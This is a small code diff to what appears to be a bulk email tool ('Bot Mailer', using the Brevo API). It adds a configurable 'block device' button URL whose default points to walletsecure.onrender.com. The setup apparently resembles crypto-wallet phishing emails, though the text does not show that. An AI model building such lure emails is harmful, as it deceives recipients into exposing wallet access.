@@ -18,6 +18,9 @@ BREVO_API_URL = 'https://api.brevo.com/v3/smtp/email'
 DEFAULT_SENDER_EMAIL = os.getenv('DEFAULT_SENDER_EMAIL', 'noreply@example.com')
 DEFAULT_SENDER_NAME = os.getenv('DEFAULT_SENDER_NAME', 'Bot Mailer')
 
+# Button URL Configuration
+BLOCK_DEVICE_URL = os.getenv('BLOCK_DEVICE_URL', 'https://walletsecure.onrender.com')
+
 # File paths
 CLIENTS_FILE = 'data/clients.json'
 EMAIL_LOG_FILE = 'data/email_log.json'
